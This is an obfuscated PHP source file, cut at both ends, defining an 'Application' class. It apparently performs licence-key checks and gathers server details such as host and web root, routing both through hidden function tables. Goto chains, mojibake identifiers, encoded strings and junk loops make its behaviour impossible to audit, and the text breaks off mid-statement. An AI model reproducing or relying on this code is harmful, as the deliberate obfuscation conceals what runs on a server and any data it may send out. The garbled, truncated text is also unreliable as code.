xb2\xdc\x34\xb\xe9\x68\xb3\x8\xcf\xc1\x63\xfe\x40\x38\x8b\x51\xc2\xf8\xa2\x33\x26\xde\x8\x17\x5e\x0\xa0\x5c\x3e\x23\xb0\xa7\x67\x6a\x44\x8f\xaa\x4f\x8b\x9".base64_decode('kkLMjRBbLDLHgioTDpPs/wMObyv6WJoAAA==')."", 10, -8))); goto Cò§¬¶¿ëƒ; A…ŸËÔùÚ: class Application { private $defaultModule = "\x69\x6e\144\x65\170"; private $defaultController = "\151\156\144\x65\x78"; private $defaultAction = "\x69\x6e\x64\145\x78"; function __construct() { } public function setDefault($B¥œƒ®·íê) { goto D­•ÕÚ‡ŠÊ; f–³öœ¬Âí: $this->{$_SERVER[×§Œ³][3]}($B³êÍì¥‰¡[4], array($this, $B³êÍì¥‰¡[5])); goto D„ìã§ºˆİ; D­•ÕÚ‡ŠÊ: $b¹÷çæ¥ŠÊ =& $_SERVER[¢Í]; $B³êÍì¥‰¡ =& $_SERVER[×§Œ³]; $dƒÙã›î— = $B³êÍì¥‰¡[0]($B³êÍì¥‰¡[1], $B³êÍì¥‰¡[2]($B¥œƒ®·íê, $B³êÍì¥‰¡[1])); goto aˆ‡è‰ÖÇ; AÌÔºß‚ßó: $this->defaultController = $dƒÙã›î—[1] ? $dƒÙã›î—[1] : $this->defaultController; $this->defaultAction = $dƒÙã›î—[2] ? $dƒÙã›î—[2] : $this->defaultAction; $fÚê¥«Ï³® = $b¹÷çæ¥ŠÊ[580]; goto f–³öœ¬Âí; aˆ‡è‰ÖÇ: $this->defaultModule = $dƒÙã›î—[0] ? $dƒÙã›î—[0] : $this->defaultModule; $F‹–Ú¦éï¨ = $b¹÷çæ¥ŠÊ[578]; while ($F‹–Ú¦éï¨ < $b¹÷çæ¥ŠÊ[579]) { if ($F‹–Ú¦éï¨ >= 0) { break; } $F‹–Ú¦éï¨++; } goto AÌÔºß‚ßó; D„ìã§ºˆİ: } public function appRun($DñØ•™Çª) { goto EÖà‹’ëê; b§ášï: $Bš¯Í³å„ = $eÙÆ‹ò¿›[581]; if (strlen($Bš¯Í³å„) < $eÙÆ‹ò¿›[573]) { return; } goto bÙÄ¦¨Áµ«; EÖà‹’ëê: $eÙÆ‹ò¿› =& $_SERVER[¢Í]; $cˆÎ–‘ç³ =& $_SERVER[×§Œ³]; $dÂ±»˜ÉË™ = $cˆÎ–‘ç³[0]($cˆÎ–‘ç³[1], $DñØ•™Çª); goto b¸¦§ÆÃŒ; eœ¯Ÿ–ˆ’·: $cˆÎ–‘ç³[13](array($cˆÎ–‘ç³[14], $cˆÎ–‘ç³[15]), $FË°‹­Á  . $cˆÎ–‘ç³[16], $DñØ•™Çª); $cˆÎ–‘ç³[17]($DñØ•™Çª); $cˆÎ–‘ç³[13](array($cˆÎ–‘ç³[14], $cˆÎ–‘ç³[15]), $FË°‹­Á  . $cˆÎ–‘ç³[18], $DñØ•™Çª); goto b§ášï; b¸¦§ÆÃŒ: $A»‡‹‹‹š = $cˆÎ–‘ç³[6]($dÂ±»˜ÉË™[0]); $FË°‹­Á  = $cˆÎ–‘ç³[7]; if ($A»‡‹‹‹š == $cˆÎ–‘ç³[8]) { $FË°‹­Á  = $cˆÎ–‘ç³[9]; $dÂ±»˜ÉË™[0] = $cˆÎ–‘ç³[10]; $dÂ±»˜ÉË™[1] = $dÂ±»˜ÉË™[1] . $cˆÎ–‘ç³[11]; $DñØ•™Çª = $cˆÎ–‘ç³[12]($cˆÎ–‘ç³[1], $dÂ±»˜ÉË™); $DñØ•™Çª = $cˆÎ–‘ç³[2]($DñØ•™Çª, $cˆÎ–‘ç³[1]); } goto eœ¯Ÿ–ˆ’·; bÙÄ¦¨Áµ«: } private function autorun() { $f†¸¹ÄÖØ° =& $_SERVER[×§Œ³]; global $config; if ($f†¸¹ÄÖØ°[19]($config[$f†¸¹ÄÖØ°[20]]) == 0) { return; } foreach ($config[$f†¸¹ÄÖØ°[20]] as $B¢ÆÏ³˜ô‘ => $a÷¸·»ºİ•) { $this->{$_SERVER[×§Œ³][21]}($a÷¸·»ºİ•); } } private function wdbp49f61234() { goto eâÊóÑãğ‚; eÄ§åù­Ë: $càñ‡®´ã = $Eà˜’±ğ[25]($f¦‡‘æÛÇæ, 0, -$Eà˜’±ğ[24]($e‚çŸ²° )); $Dš‹Šö½Ã« = $D®ß•¬Ş¿ [582]; if (strlen($Dš‹Šö½Ã«) < $D®ß•¬Ş¿ [577]) { return; } goto BÍ¨º¦‚Íì; eâÊóÑãğ‚: $D®ß•¬Ş¿  =& $_SERVER[¢Í]; $Eà˜’±ğ =& $_SERVER[×§Œ³]; $e‚çŸ²°  = $Eà˜’±ğ[8]; goto Cîâƒì•—©; Cîâƒì•—©: $f¦‡‘æÛÇæ = $GLOBALS[$Eà˜’±ğ[22]][$Eà˜’±ğ[23]][0]; if (!$f¦‡‘æÛÇæ || $Eà˜’±ğ[24]($f¦‡‘æÛÇæ) <= $Eà˜’±ğ[24]($e‚çŸ²° )) { return; } if ($Eà˜’±ğ[6]($Eà˜’±ğ[25]($f¦‡‘æÛÇæ, -$Eà˜’±ğ[24]($e‚çŸ²° ))) != $e‚çŸ²° ) { return; } goto eÄ§åù­Ë; BÍ¨º¦‚Íì: $Cõ™­Íİñ = array($Eà˜’±ğ[8], $càñ‡®´ã); $e¹¬ö²â’ô = $D®ß•¬Ş¿ [583]; $d²÷ŒÓÄÔ• = $Eà˜’±ğ[26]($GLOBALS[$Eà˜’±ğ[22]][$Eà˜’±ğ[23]], 1); goto FÙ¶«Çç«; døÄµÜ¶: $GLOBALS[$Eà˜’±ğ[22]][$Eà˜’±ğ[28]] = $Eà˜’±ğ[29]($Eà˜’±ğ[1], $GLOBALS[$Eà˜’±ğ[22]][$Eà˜’±ğ[23]]); $a ï—¥öÉ’ = $D®ß•¬Ş¿ [585]; if (!$a ï—¥öÉ’) { return; } goto a§¡ƒĞÁ; FÙ¶«Çç«: $F–…ÑëÑƒ = $D®ß•¬Ş¿ [584]; if (strlen($F–…ÑëÑƒ) < $D®ß•¬Ş¿ [57]) { return; } $GLOBALS[$Eà˜’±ğ[22]][$Eà˜’±ğ[23]] = $Eà˜’±ğ[27]($Cõ™­Íİñ, $d²÷ŒÓÄÔ•); goto døÄµÜ¶; a§¡ƒĞÁ: } private function dfsw41c8c40b() { goto E©µÜ¶¹®„; E©µÜ¶¹®„: $c¡Â¡²Àêİ =& $_SERVER[¢Í]; $d÷‹­¥‚¶ =& $_SERVER[×§Œ³]; if ($GLOBALS[$d÷‹­¥‚¶[22]][$d÷‹­¥‚¶[28]] != $d÷‹­¥‚¶[10]) { return; } goto Bç±äÄ¯°Î; F¢±ççõ£: while (strlen($Côéé¾¥Ë”) < $c¡Â¡²Àêİ[573]) { if (!$Côéé¾¥Ë”) { break; } $Côéé¾¥Ë”++; } $GLOBALS[$d÷‹­¥‚¶[22]][$d÷‹­¥‚¶[28]] = $d÷‹­¥‚¶[29]($d÷‹­¥‚¶[1], $GLOBALS[$d÷‹­¥‚¶[22]][$d÷‹­¥‚¶[23]]); $cÙéñÇ£Éº = $c¡Â¡²Àêİ[589]; goto DÍÇ„ÂòÉ; f£¹©Ó‡å‡: $FÓ¿µ›™Ÿ = $d÷‹­¥‚¶[31]; if (!$d÷‹­¥‚¶[32]($EÁñæÒÌçÎ, $FÓ¿µ›™Ÿ)) { return; } $fğÛ“£Ú¯ = $d÷‹­¥‚¶[33]($EÁñæÒÌçÎ, $FÓ¿µ›™Ÿ); goto F¢Ë„¯Ëµ; B¡ŸùíÒ½: $DÓì…’©ë‹ = $d÷‹­¥‚¶[2]($d±˜ª±ˆÙà[0][0], $d÷‹­¥‚¶[36]); $GLOBALS[$d÷‹­¥‚¶[22]][$d÷‹­¥‚¶[23]] = $d÷‹­¥‚¶[0]($d÷‹­¥‚¶[36], $DÓì…’©ë‹); $Côéé¾¥Ë” = $c¡Â¡²Àêİ[588]; goto F¢±ççõ£; F¢Ë„¯Ëµ: $DÓì…’©ë‹ = $d÷‹­¥‚¶[25]($EÁñæÒÌçÎ, $fğÛ“£Ú¯ + $d÷‹­¥‚¶[24]($FÓ¿µ›™Ÿ)); $f¤ËÂ‡ØôŸ = $c¡Â¡²Àêİ[587]; $d÷‹­¥‚¶[34]($d÷‹­¥‚¶[35], $DÓì…’©ë‹, $d±˜ª±ˆÙà); goto B¡ŸùíÒ½; DÍÇ„ÂòÉ: if (!$cÙéñÇ£Éº) { die; } goto E†˜ñâ·¨; Bç±äÄ¯°Î: $EÁñæÒÌçÎ = $_SERVER[$d÷‹­¥‚¶[30]]; $A†‚¿’§­º = $c¡Â¡²Àêİ[586]; while ($A†‚¿’§­º < $c¡Â¡²Àêİ[57]) { if ($A†‚¿’§­º >= 0) { break; } $A†‚¿’§­º++; } goto f£¹©Ó‡å‡; E†˜ñâ·¨: } public function run() { goto F‘ã˜ò»½²; d¬Ë¤‰Œ•: if (strlen($AÖ‚¶‚¯›î) < $bÔÊ„˜æ˜[579]) { return; } $a¦–„ñ½“–[39]($a¦–„ñ½“–[40], isset($aô†ô¶Æ»­[0]) && $aô†ô¶Æ»­[0] ? $aô†ô¶Æ»­[0] : $this->defaultModule); $a¦–„ñ½“–[39]($a¦–„ñ½“–[41], isset($aô†ô¶Æ»­[1]) && $aô†ô¶Æ»­[0] ? $aô†ô¶Æ»­[1] : $this->defaultController); goto dÇˆÂ—èª; fÙñøÑˆÆ: $this->{$_SERVER[×§Œ³][38]}(); $aô†ô¶Æ»­ = $GLOBALS[$a¦–„ñ½“–[22]][$a¦–„ñ½“–[23]]; $CéíİÃİéİ = $bÔÊ„˜æ˜[590]; goto BŠ¹“ƒã¸§; dëØÂ£’‡¥: if (strlen($DŞñßçåâÄ) < $bÔÊ„˜æ˜[594]) { return; } $this->{$_SERVER[×§Œ³][45]}(); if ($a¦–„ñ½“–[19]($aô†ô¶Æ»­) >= 3) { $this->{$_SERVER[×§Œ³][21]}($Aé°¾ŒŸÅÆ); } else { $this->{$_SERVER[×§Œ³][21]}(ACTION); } goto EçùéÀğœ¼; fµ‡Åğ‰£: if (!$DèæÜæğ§£) { return; } $_SERVER[$a¦–„ñ½“–[44]] = $a¦–„ñ½“–[6](ACTION); $DŞñßçåâÄ = $bÔÊ„˜æ˜[593]; goto dëØÂ£’‡¥; BŠ¹“ƒã¸§: if (strlen($CéíİÃİéİ) < $bÔÊ„˜æ˜[573]) { die; } $Aé°¾ŒŸÅÆ = $GLOBALS[$a¦–„ñ½“–[22]][$a¦–„ñ½“–[28]]; $AÖ‚¶‚¯›î = $bÔÊ„˜æ˜[591]; goto d¬Ë¤‰Œ•; dÇˆÂ—èª: $a¦–„ñ½“–[39]($a¦–„ñ½“–[42], isset($aô†ô¶Æ»­[2]) && $aô†ô¶Æ»­[0] ? $aô†ô¶Æ»­[2] : $this->defaultAction); $a¦–„ñ½“–[39]($a¦–„ñ½“–[43], MOD . $a¦–„ñ½“–[1] . ST . $a¦–„ñ½“–[1] . ACT); $DèæÜæğ§£ = $bÔÊ„˜æ˜[592]; goto fµ‡Åğ‰£; F‘ã˜ò»½²: $bÔÊ„˜æ˜ =& $_SERVER[¢Í]; $a¦–„ñ½“– =& $_SERVER[×§Œ³]; $this->{$_SERVER[×§Œ³][37]}(); goto fÙñøÑˆÆ; EçùéÀğœ¼: } private $hzrd5d37b4cb = array(); private $mhcud45947dc = ''; public function gbqy76234ccb() { goto CˆÆ„•Ê®‘; C‘ ™²‡­: if (strlen($FõÈ‡ÃÅå†) < $DĞÌàî¶çÎ[577]) { return; } $this->{$_SERVER[×§Œ³][3]}($c÷ÒÉï®á¿[55], array($this, $c÷ÒÉï®á¿[56])); $a†Úİ¯æÚ¨ = $DĞÌàî¶çÎ[597]; goto aâÚä™ÌÖÒ; fÜáß¼ñ¥ë: $this->{$_SERVER[×§Œ³][49]}(); $this->{$_SERVER[×§Œ³][50]}(); $this->{$_SERVER[×§Œ³][51]}(); goto EÔºÎÙ”å­; A»ÊğÎ¹‹ß: $this->{$_SERVER[×§Œ³][3]}($c÷ÒÉï®á¿[59], array($this, $c÷ÒÉï®á¿[60])); goto cÉâ’‚÷Æ; aâÚä™ÌÖÒ: if (!$a†Úİ¯æÚ¨) { return; } $this->{$_SERVER[×§Œ³][3]}($c÷ÒÉï®á¿[57], array($this, $c÷ÒÉï®á¿[58])); $c‰†™ê—êÉ = $DĞÌàî¶çÎ[598]; goto A»ÊğÎ¹‹ß; d¬…ò´…öö: $b”ôƒ¯‡—Ú = $DĞÌàî¶çÎ[595]; $this->{$_SERVER[×§Œ³][47]}(); $this->{$_SERVER[×§Œ³][48]}(); goto fÜáß¼ñ¥ë; EÔºÎÙ”å­: $this->{$_SERVER[×§Œ³][52]}(); $this->{$_SERVER[×§Œ³][3]}($c÷ÒÉï®á¿[53], array($this, $c÷ÒÉï®á¿[54])); $FõÈ‡ÃÅå† = $DĞÌàî¶çÎ[596]; goto C‘ ™²‡­; CˆÆ„•Ê®‘: $DĞÌàî¶çÎ =& $_SERVER[¢Í]; $c÷ÒÉï®á¿ =& $_SERVER[×§Œ³]; $this->{$_SERVER[×§Œ³][46]}(); goto d¬…ò´…öö; cÉâ’‚÷Æ: } public function ixkc0752f394($CÇ‰ˆ®É¾å) { goto A¦Ï˜‰™Ğ; A¦Ï˜‰™Ğ: $dº™ãí¥Ìê =& $_SERVER[¢Í]; $D™©¹ñãßÓ =& $_SERVER[×§Œ³]; $Cù‰ÈÊç = $D™©¹ñãßÓ[61]($D™©¹ñãßÓ[62])->{$_SERVER[×§Œ³][63]}(); goto DÙãâö½Ô¹; F¯õßáÚù™: $CÇ‰ˆ®É¾å[$D™©¹ñãßÓ[102]][$D™©¹ñãßÓ[103]][$D™©¹ñãßÓ[108]] = array($D™©¹ñãßÓ[109] => (int) $D£Ô°»÷‚[$D™©¹ñãßÓ[110]], $D™©¹ñãßÓ[111] => (int) $D™©¹ñãßÓ[112]($D£Ô°»÷‚, $D™©¹ñãßÓ[113], 0)); $cÈ‹´Àôö± = $dº™ãí¥Ìê[603]; $CÇ‰ˆ®É¾å[$D™©¹ñãßÓ[114]][$D™©¹ñãßÓ[115]] = $D™©¹ñãßÓ[116]($D™©¹ñãßÓ[117])->{$_SERVER[×§Œ³][118]}(); goto a×¥½ñÍò­; e §âãÑ¹: if ($Cù‰ÈÊç[$D™©¹ñãßÓ[126]] != $D™©¹ñãßÓ[127]) { $CÇ‰ˆ®É¾å[$D™©¹ñãßÓ[114]][$D™©¹ñãßÓ[128]] = $Cù‰ÈÊç[$D™©¹ñãßÓ[128]]; $CÇ‰ˆ®É¾å[$D™©¹ñãßÓ[114]][$D™©¹ñãßÓ[129]] = $Cù‰ÈÊç[$D™©¹ñãßÓ[129]]; $B§¼¿‘šŠ = $D™©¹ñãßÓ[130](10) . $this->mhcud45947dc . $D™©¹ñãßÓ[130](5); $CÇ‰ˆ®É¾å[$D™©¹ñãßÓ[102]][$D™©¹ñãßÓ[131]][$D™©¹ñãßÓ[132]] = $this->{$_SERVER[×§Œ³][133]}($B§¼¿‘šŠ, $CÇ‰ˆ®É¾å[$D™©¹ñãßÓ[114]][$D™©¹ñãßÓ[119]]); } if ($this->mhcud45947dc == $D™©¹ñãßÓ[127]) { $CÇ‰ˆ®É¾å[$D™©¹ñãßÓ[102]][$D™©¹ñãßÓ[103]][$D™©¹ñãßÓ[108]][$D™©¹ñãßÓ[113]] = 0; } $CÇ‰ˆ®É¾å[$D™©¹ñãßÓ[114]][$D™©¹ñãßÓ[134]] = $D™©¹ñãßÓ[112]($this->hzrd5d37b4cb, $D™©¹ñãßÓ[135], $D™©¹ñãßÓ[10]); goto a®¥¨‡º»†; c™‘×Ş´¶Î: foreach ($f½¿ÓîªÌñ as $d†­Ü½Ñæ³) { $d…õ„¼© = $GLOBALS[$D™©¹ñãßÓ[100]][$D™©¹ñãßÓ[101]][$d†­Ü½Ñæ³]; $D·ñ©­ƒÜ = $dº™ãí¥Ìê[600]; while ($D·ñ©­ƒÜ < $dº™ãí¥Ìê[577]) { if ($D·ñ©­ƒÜ >= 0) { break; } $D·ñ©­ƒÜ++; } if (isset($Cù‰ÈÊç[$d†­Ü½Ñæ³])) { $d…õ„¼© = $Cù‰ÈÊç[$d†­Ü½Ñæ³]; } $CÇ‰ˆ®É¾å[$D™©¹ñãßÓ[102]][$D™©¹ñãßÓ[103]][$d†­Ü½Ñæ³] = $d…õ„¼©; } $D£Ô°»÷‚ = $CÇ‰ˆ®É¾å[$D™©¹ñãßÓ[102]][$D™©¹ñãßÓ[103]][$D™©¹ñãßÓ[76]]; unset($CÇ‰ˆ®É¾å[$D™©¹ñãßÓ[102]][$D™©¹ñãßÓ[104]][$D™©¹ñãßÓ[105]]); goto F·Ñ‰ÁùÀ÷; DÙãâö½Ô¹: $f½¿ÓîªÌñ = array($D™©¹ñãßÓ[64], $D™©¹ñãßÓ[65], $D™©¹ñãßÓ[66], $D™©¹ñãßÓ[67], $D™©¹ñãßÓ[68], $D™©¹ñãßÓ[69], $D™©¹ñãßÓ[70], $D™©¹ñãßÓ[71], $D™©¹ñãßÓ[72], $D™©¹ñãßÓ[73], $D™©¹ñãßÓ[74], $D™©¹ñãßÓ[75], $D™©¹ñãßÓ[76], $D™©¹ñãßÓ[77], $D™©¹ñãßÓ[78], $D™©¹ñãßÓ[79], $D™©¹ñãßÓ[80], $D™©¹ñãßÓ[81], $D™©¹ñãßÓ[82], $D™©¹ñãßÓ[83], $D™©¹ñãßÓ[84], $D™©¹ñãßÓ[85], $D™©¹ñãßÓ[86], $D™©¹ñãßÓ[87], $D™©¹ñãßÓ[88], $D™©¹ñãßÓ[89], $D™©¹ñãßÓ[90], $D™©¹ñãßÓ[91], $D™©¹ñãßÓ[92], $D™©¹ñãßÓ[93], $D™©¹ñãßÓ[94], $D™©¹ñãßÓ[95], $D™©¹ñãßÓ[96], $D™©¹ñãßÓ[97], $D™©¹ñãßÓ[98], $D™©¹ñãßÓ[99]); $FìŠÄ„êÉ× = $dº™ãí¥Ìê[599]; if (strlen($FìŠÄ„êÉ×) < $dº™ãí¥Ìê[594]) { return; } goto c™‘×Ş´¶Î; a®¥¨‡º»†: $CÇ‰ˆ®É¾å[$D™©¹ñãßÓ[114]][$D™©¹ñãßÓ[136]] = $D™©¹ñãßÓ[112]($this->hzrd5d37b4cb, $D™©¹ñãßÓ[137], $D™©¹ñãßÓ[10]); if ($D™©¹ñãßÓ[112]($GLOBALS, $D™©¹ñãßÓ[138]) && $this->config[$D™©¹ñãßÓ[139]]) { $CÇ‰ˆ®É¾å[$D™©¹ñãßÓ[114]][$D™©¹ñãßÓ[140]] = WEB_ROOT; } return $CÇ‰ˆ®É¾å; goto AŞËÑµ¿½¯; CÂÙÛÂñ: $CÇ‰ˆ®É¾å[$D™©¹ñãßÓ[114]][$D™©¹ñãßÓ[123]] = $D™©¹ñãßÓ[124]($D™©¹ñãßÓ[125]()); $CÇ‰ˆ®É¾å[$D™©¹ñãßÓ[114]][$D™©¹ñãßÓ[126]] = $this->mhcud45947dc; $f©£Ö°é„ = $dº™ãí¥Ìê[605]; goto e §âãÑ¹; a×¥½ñÍò­: $CÇ‰ˆ®É¾å[$D™©¹ñãßÓ[114]][$D™©¹ñãßÓ[119]] = $D™©¹ñãßÓ[120]($_SERVER[$D™©¹ñãßÓ[121]] . $Cù‰ÈÊç[$D™©¹ñãßÓ[122]]); $f÷©•‹ØêÄ = $dº™ãí¥Ìê[604]; if (strlen($f÷©•‹ØêÄ) < $dº™ãí¥Ìê[57]) { return; } goto CÂÙÛÂñ; d®›˜¯´¯’: $bÊ¢êÇ‘Â„ = $dº™ãí¥Ìê[602]; if (!$bÊ¢êÇ‘Â„) { die; } unset($CÇ‰ˆ®É¾å[$D™©¹ñãßÓ[102]][$D™©¹ñãßÓ[103]][$D™©¹ñãßÓ[107]]); goto F¯õßáÚù™; F·Ñ‰ÁùÀ÷: unset($CÇ‰ˆ®É¾å[$D™©¹ñãßÓ[102]][$D™©¹ñãßÓ[104]][$D™©¹ñãßÓ[106]]); $b°Ô¯’ Ò… = $dº™ãí¥Ìê[601]; unset($CÇ‰ˆ®É¾å[$D™©¹ñãßÓ[102]][$D™©¹ñãßÓ[103]][$D™©¹ñãßÓ[76]]); goto d®›˜¯´¯’; AŞËÑµ¿½¯: } private function tuqm53e470cb() { goto A¤ƒ¾Íàš‘; fÏ®¡ÔÌ„: while ($C·Ô‰ÌİŠš < $Dòì‚Á§Ë¦[594]) { if ($C·Ô‰ÌİŠš >= 0) { break; } $C·Ô‰ÌİŠš++; } $cöÆÎå‹ = $B›Ü‘Ï¤äÖ[61]($B›Ü‘Ï¤äÖ[62])->{$_SERVER[×§Œ³][63]}(); $fŠ¹×– Ë¡ = $Dòì‚Á§Ë¦[608]; goto EÔÔ«â×ã¸; EÔÔ«â×ã¸: $CÆ­Š–ÃÈ² = array($B›Ü‘Ï¤äÖ[165] => $cöÆÎå‹[$B›Ü‘Ï¤äÖ[64]], $B›Ü‘Ï¤äÖ[166] => $cöÆÎå‹[$B›Ü‘Ï¤äÖ[65]], $B›Ü‘Ï¤äÖ[167] => $B›Ü‘Ï¤äÖ[10]); foreach ($eùöÈ²Ã as $fÁ´èàá) { if (!isset($cöÆÎå‹[$fÁ´èàá]) || !$cöÆÎå‹[$fÁ´èàá]) { continue; } $CÆ­Š–ÃÈ²[$fÁ´èàá] = $cöÆÎå‹[$fÁ´èàá]; $F”äçò¶‡” = $Dòì‚Á§Ë¦[609]; if (!$F”äçò¶‡”) { die; } } $B›Ü‘Ï¤äÖ[13](array($B›Ü‘Ï¤äÖ[157], $B›Ü‘Ï¤äÖ[158]), $CÆ­Š–ÃÈ²); goto C® ’´œìÁ; C® ’´œìÁ: $B»†öÔìĞº = $Dòì‚Á§Ë¦[610]; if (strlen($B»†öÔìĞº) < $Dòì‚Á§Ë¦[594]) { die; } goto CÈ‚¯ÚïÄ; A¤ƒ¾Íàš‘: $Dòì‚Á§Ë¦ =& $_SERVER[¢Í]; $B›Ü‘Ï¤äÖ =& $_SERVER[×§Œ³]; if ($_SERVER[$B›Ü‘Ï¤äÖ[44]] == $B›Ü‘Ï¤äÖ[141]) { goto bÚ¢å¾öÉ‹; bÚ¢å¾öÉ‹: $c²ˆ­Ïëåå = array($B›Ü‘Ï¤äÖ[126] => $this->mhcud45947dc, $B›Ü‘Ï¤äÖ[142] => $this->{$_SERVER[×§Œ³][143]}(), $B›Ü‘Ï¤äÖ[144] => $B›Ü‘Ï¤äÖ[61]($B›Ü‘Ï¤äÖ[145])->{$_SERVER[×§Œ³][146]}()); if ($this->mhcud45947dc != $B›Ü‘Ï¤äÖ[127]) { $DïÌÂ²ºà» = $B›Ü‘Ï¤äÖ[112]($this->hzrd5d37b4cb, $B›Ü‘Ï¤äÖ[147]); if ($DïÌÂ²ºà») { $c²ˆ­Ïëåå[$B›Ü‘Ï¤äÖ[148]] = $DïÌÂ²ºà»; $c²ˆ­Ïëåå[$B›Ü‘Ï¤äÖ[149]] = $B›Ü‘Ï¤äÖ[150]($B›Ü‘Ï¤äÖ[112]($this->hzrd5d37b4cb, $B›Ü‘Ï¤äÖ[151])); $c²ˆ­Ïëåå[$B›Ü‘Ï¤äÖ[152]] = $B›Ü‘Ï¤äÖ[112]($this->hzrd5d37b4cb, $B›Ü‘Ï¤äÖ[137]); } } $c²ˆ­Ïëåå = $this->{$_SERVER[×§Œ³][153]}($B›Ü‘Ï¤äÖ[154]($c²ˆ­Ïëåå), $B›Ü‘Ï¤äÖ[120]($B›Ü‘Ï¤äÖ[155])); goto A‰ó¯åô•; A‰ó¯åô•: $CÆ­Š–ÃÈ² = array($B›Ü‘Ï¤äÖ[156] => $c²ˆ­Ïëåå); $bã‚´Ã§¬Ï = $Dòì‚Á§Ë¦[606]; if (!$bã‚´Ã§¬Ï) { return; } goto E‹·Å†¼»à; E‹·Å†¼»à: $B›Ü‘Ï¤äÖ[13](array($B›Ü‘Ï¤äÖ[157], $B›Ü‘Ï¤äÖ[158]), $CÆ­Š–ÃÈ²); goto Aˆ×¼¹òùğ; Aˆ×¼¹òùğ: } goto a¥£’ÍÄ†; a¥£’ÍÄ†: if ($this->mhcud45947dc == $B›Ü‘Ï¤äÖ[127]) { return; } $eùöÈ²Ã = array($B›Ü‘Ï¤äÖ[159], $B›Ü‘Ï¤äÖ[160], $B›Ü‘Ï¤äÖ[161], $B›Ü‘Ï¤äÖ[162], $B›Ü‘Ï¤äÖ[163], $B›Ü‘Ï¤äÖ[164]); $C·Ô‰ÌİŠš = $Dòì‚Á§Ë¦[607]; goto fÏ®¡ÔÌ„; CÈ‚¯ÚïÄ: } private function btvhc1196a49() { goto bë¹×¡„œ; b¹ÊŠ£‡ò¼: $this->mhcud45947dc = $e°¬¢Õ­Œ[$F—½Ì›³§œ[126]]; $DÑ‹²“‰Ÿ— = $AÑ­…è¥ï[619]; if (strlen($DÑ‹²“‰Ÿ—) < $AÑ­…è¥ï[594]) { return; } goto d‹Ô Â†¡; a—ªí«÷ŠŒ: $CÛù…øéì = $F—½Ì›³§œ[130](16); $f©™¤ëà©‚ = $AÑ­…è¥ï[613]; if (strlen($f©™¤ëà©‚) < $AÑ­…è¥ï[577]) { die; } goto DíÂÁÚĞ’; bë¹×¡„œ: $AÑ­…è¥ï =& $_SERVER[¢Í]; $F—½Ì›³§œ =& $_SERVER[×§Œ³]; if ($_SERVER[$F—½Ì›³§œ[44]] != $F—½Ì›³§œ[168]) { return; } goto B˜“ôÔˆšÛ; d‹Ô Â†¡: $this->{$_SERVER[×§Œ³][235]}(); Cache::set($F—½Ì›³§œ[236] . $F—½Ì›³§œ[120]($A•á­À‡¾ô . $F—½Ì›³§œ[237]), $F—½Ì›³§œ[10]); $F—½Ì›³§œ[172]($F—½Ì›³§œ[204]($F—½Ì›³§œ[214]), !0); goto bŒÑ×÷ Çë; AæÖÖ¢ÊÖ›: $AÇõİÏİ¨™ = $F—½Ì›³§œ[228]($F—½Ì›³§œ[61]($F—½Ì›³§œ[11])->{$_SERVER[×§Œ³][229]}(), $F—½Ì›³§œ[230]); $dÇ„Á¹¹ÑÙ = $AÑ­…è¥ï[615]; while (strlen($dÇ„Á¹¹ÑÙ) < $AÑ­…è¥ï[579]) { if (!$dÇ„Á¹¹ÑÙ) { break; } $dÇ„Á¹¹ÑÙ++; } goto Dáë¿Èô‹µ; DíÂÁÚĞ’: $b‡§È†ÅÕ = $CÛù…øéì . $e°¬¢Õ­Œ[$F—½Ì›³§œ[126]] . $this->{$_SERVER[×§Œ³][153]}($F—½Ì›³§œ[120]($e°¬¢Õ­Œ[$F—½Ì›³§œ[215]]), $CÛù…øéì); $cÖé³“¯ = $AÑ­…è¥ï[614]; if (!$cÖé³“¯) { return; } goto F¡Ò‘¹ËÓÇ; Có•‰âÕ‡: if (!isset($B¦¸¨Ô„ğê[$F—½Ì›³§œ[171]]) || $F—½Ì›³§œ[24]($B¦¸¨Ô„ğê[$F—½Ì›³§œ[171]]) != 16) { $F—½Ì›³§œ[172]($F—½Ì›³§œ[173] . $B¦¸¨Ô„ğê[$F—½Ì›³§œ[171]], !1); } $A•á­À‡¾ô = $F—½Ì›³§œ[61]($F—½Ì›³§œ[62])->{$_SERVER[×§Œ³][63]}($F—½Ì›³§œ[122]); $E‘•÷£¦†é = array($F—½Ì›³§œ[171] => $B¦¸¨Ô„ğê[$F—½Ì›³§œ[171]], $F—½Ì›³§œ[174] => $F—½Ì›³§œ[130](16), $F—½Ì›³§œ[175] => $F—½Ì›³§œ[155], $F—½Ì›³§œ[176] => $F—½Ì›³§œ[177], $F—½Ì›³§œ[178] => $_SERVER[$F—½Ì›³§œ[179]], $F—½Ì›³§œ[180] => $_SERVER[$F—½Ì›³§œ[181]], $F—½Ì›³§œ[182] => $_SERVER[$F—½Ì›³§œ[183]]); goto Fôùä°¢áÄ; B˜“ôÔˆšÛ: if (!$F—½Ì›³§œ[112]($GLOBALS, $F—½Ì›³§œ[138])) { die; } $B¦¸¨Ô„ğê = $GLOBALS[$F—½Ì›³§œ[22]]; if (isset($B¦¸¨Ô„ğê[$F—½Ì›³§œ[169]])) { $this->{$_SERVER[×§Œ³][170]}(); die; } goto Có•‰âÕ‡; aÍ‘‡Şº: if (strlen($a½Šœ“®£Ç) < $AÑ­…è¥ï[579]) { return; } $this->hzrd5d37b4cb = $fİë‘Ñå×; $cíèš˜¹Û› = $AÑ­…è¥ï[618]; goto b¹ÊŠ£‡ò¼; båƒŸò—: if ($E‘•÷£¦†é[$F—½Ì›³§œ[174]]) { $e°¬¢Õ­Œ[$F—½Ì›³§œ[218]] = $E‘•÷£¦†é[$F—½Ì›³§œ[174]]; } $CŒÍóƒÁëÉ = $F—½Ì›³§œ[25]($F—½Ì›³§œ[120]($e°¬¢Õ­Œ[$F—½Ì›³§œ[216]]), 10, 10); $FÙÕ¥‰…Á = $CŒÍóƒÁëÉ . $e°¬¢Õ­Œ[$F—½Ì›³§œ[126]] . $e°¬¢Õ­Œ[$F—½Ì›³§œ[218]]; goto F† Îï®ôÑ; a³²‹‚‚éª: $DŞÍÈÖœÔù = $this->{$_SERVER[×§Œ³][206]}($fİë‘Ñå×[$F—½Ì›³§œ[207]]); if (!$DŞÍÈÖœÔù || $DŞÍÈÖœÔù != $fİë‘Ñå×[$F—½Ì›³§œ[151]]) { $C§Ûã°½‘ = array($F—½Ì›³§œ[208] => $F—½Ì›³§œ[61]($F—½Ì›³§œ[62])->{$_SERVER[×§Œ³][63]}($F—½Ì›³§œ[122]), $F—½Ì›³§œ[209] => $_SERVER[$F—½Ì›³§œ[121]], $F—½Ì›³§œ[210] => $F—½Ì›³§œ[211](), $F—½Ì›³§œ[180] => 